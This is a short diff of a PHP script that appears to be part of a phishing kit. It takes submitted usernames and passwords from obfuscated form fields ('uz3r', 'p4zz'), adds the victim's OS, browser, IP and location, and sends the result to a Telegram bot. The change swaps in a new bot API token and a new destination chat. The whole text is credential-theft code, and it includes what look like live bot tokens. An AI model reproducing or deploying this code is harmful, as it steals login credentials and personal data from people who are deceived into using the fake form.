@@ -72,11 +72,11 @@ if ( isset ($_POST['uz3r']) && isset ($_POST['p4zz'])  ){
 
 $message = "uzer: ".$_POST['uz3r']." - p4zz: ".$_POST['p4zz']."  \r\n";
 $message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
-$apiToken = "5949300208:AAEDrXMf0ywpXprlNvf94CxbY-I0PR-PMV8";
+$apiToken = "5830940342:AAFD-f94b1SfPAJnjOqi07f4rGhr-hGskos";
 
 
 $data = [
-  'chat_id' => '@flowmexico',
+  'chat_id' => '@printhost',
 
    'text' => $message
 ];
